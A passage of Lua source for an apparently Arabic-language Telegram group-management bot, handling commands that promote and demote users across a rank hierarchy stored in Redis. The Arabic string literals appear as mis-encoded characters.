Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ­Ψ°Ω ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)') or text:match('ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)')
Devmfm:srem(mustafa..'mfm:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ Ψ§έͺΨ«ΩΨ£ΩΩΩ°ΩΩΩ*")  
end end
--     Source Escobar     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('Ψ§ΨΆΩ ΩΨ·ΩΨ±') or text ==('Ψ±ΩΨΉ ΩΨ·ΩΨ±') and ChCheck(msg) then
function sudo_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± @(.*)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± @(.*)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^Ψ§ΨΆΩ ΩΨ·ΩΨ± (%d+)') or text:match('^Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ§ΨΆΩ ΩΨ·ΩΨ± (%d+)') or text:match('Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)')
Devmfm:sadd(mustafa..'mfm:SudoBot:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
end
--     Source Escobar     --
--       Rem SudoBot      --
if text ==('Ψ­Ψ°Ω ΩΨ·ΩΨ±') or text ==('ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ±') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± @(.*)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± @(.*)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^Ψ­Ψ°Ω ΩΨ·ΩΨ± (%d+)') or text:match('^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ­Ψ°Ω ΩΨ·ΩΨ± (%d+)') or text:match('ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± (%d+)')
Devmfm:srem(mustafa..'mfm:SudoBot:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ*")  
end end
--     Source Escobar     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)')
Devmfm:sadd(mustafa..'mfm:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end
--     Source Escobar     --
--      Rem ManagerAll    --
if text ==('ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)')
Devmfm:srem(mustafa..'mfm:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end end
--     Source Escobar     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('Ψ±ΩΨΉ Ψ§Ψ―ΩΩ ΨΉΨ§Ω') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ Ψ§Ψ―ΩΩ ΨΉΨ§Ω (%d+)')
Devmfm:sadd(mustafa..'mfm:AdminAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end
--     Source Escobar     --
--      Rem adminall      --
if text ==('ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ ΨΉΨ§Ω') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ ΨΉΨ§Ω (%d+)')
Devmfm:srem(mustafa..'mfm:AdminAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ*")  
end end
--     Source Escobar     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω (%d+)')
Devmfm:sadd(mustafa..'mfm:VipAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
end
--     Source Escobar     --
--       Rem Vipall       --
if text ==('ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω (%d+)')
Devmfm:srem(mustafa..'mfm:VipAll:',user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω*")  
end end
--     Source Escobar     --
--  Set BasicConstructor  --
if ChatType == 'sp' or ChatType == 'gp'  then
if mfmConstructor(msg) then
if text ==('Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΨ΄ΩΨ¦ Ψ’Ψ³Ϋ§Ψ’Ψ³Ϋ§Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΨ΄ΩΨ¦ Ψ’Ψ³Ϋ§Ψ’Ψ³Ϋ§Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)')
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΨ΄ΩΨ¦ Ψ’Ψ³Ϋ§Ψ’Ψ³Ϋ§Ω*")  
end
--     Source Escobar     --
--  Rem BasicConstructor  --
if text ==('ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩΩΨ΄ΩΨ¦ Ψ’Ψ³Ϋ§Ψ’Ψ³Ϋ§Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩΩΨ΄ΩΨ¦ Ψ’Ψ³Ϋ§Ψ’Ψ³Ϋ§Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)')
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
end end
if text ==('Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω') and not mfmConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΩΨ§ΩΩΨ·ΩΨ±ΩΩ ΩΩΨ·', 1, 'md')
end
--     Source Escobar     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('Ψ±ΩΨΉ ΩΩΨ΄Ψ¦') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)') and ChCheck(msg) then
local username = text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)') and ChCheck(msg) then
local user = text:match('Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)')
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
end
--     Source Escobar     --
--    Rem  Constructor    --
if text ==('ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)') and ChCheck(msg) then
local username = text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)') and ChCheck(msg) then
local user = text:match('ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)')
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω*")  
end 
end
--     Source Escobar     --
--      Set Manager       --
if Constructor(msg) then
if text ==('Ψ±ΩΨΉ ΩΨ―ΩΨ±') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,result.sender_user_id_)
